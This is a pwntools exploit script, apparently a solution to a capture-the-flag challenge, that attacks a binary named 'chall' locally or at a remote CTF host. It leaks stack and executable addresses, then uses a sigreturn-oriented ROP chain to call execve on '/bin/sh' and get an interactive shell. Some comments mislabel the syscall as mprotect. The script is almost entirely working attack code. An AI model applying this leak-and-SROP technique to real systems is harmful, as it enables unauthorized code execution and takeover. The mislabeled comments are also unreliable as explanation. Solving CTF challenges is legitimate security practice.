#!/usr/bin/python3

from pwn import *

exe = ELF('chall', checksec=False)
# libc = ELF('0', checksec=False)
context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                brva 0x10EC 

                c
                ''')
                input()
rop = ROP(exe)
# rop.write(7, 8, 9)
# find_gadget(['pop rdi, ret'])
info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('challenges1.gcc-ctf.com', 4004)
else:
        p = process(exe.path)

GDB()
def send(size, payload):
        sla(b'> ', str(size))
        sa(b'> ', payload)
send(0x290, b'a'*8)
# p.recv(0x148)
# exe.address = u64(p.recv(8)) - 0x1118
p.recv(0x220-8)
stack = u64(p.recv(8)) - 0x228
exe.address = u64(p.recv(8)) - 0x1133

info("exe.address: " + hex(exe.address))
info("exe.address: " + hex(stack))


inc_rax = exe.address + 0x100C
xor_rax = exe.address + 0x1000
syscall = exe.address + 0x0000000000001034
frame = SigreturnFrame()
frame.rax = 0x3b          # SYS_mprotect
frame.rdi = stack    # addr
frame.rsi = 0     # len
frame.rdx = 0           # proto
frame.rbp = stack
frame.rsp = stack    # point new rsp after the code section
frame.rip = syscall    # to the 1st syscall instruction, so we can then read second payload on new stack and execute.
pa = b'/bin/sh\0'
pa = pa.ljust(520)
pa +=  flat(
        xor_rax,
        inc_rax,inc_rax,inc_rax,inc_rax,inc_rax,inc_rax,inc_rax,inc_rax,inc_rax,inc_rax,inc_rax,inc_rax,inc_rax,inc_rax,inc_rax,
        syscall
)
pa = pa.ljust(0x290) + bytes(frame)
send(len(pa), pa)
p.interactive()
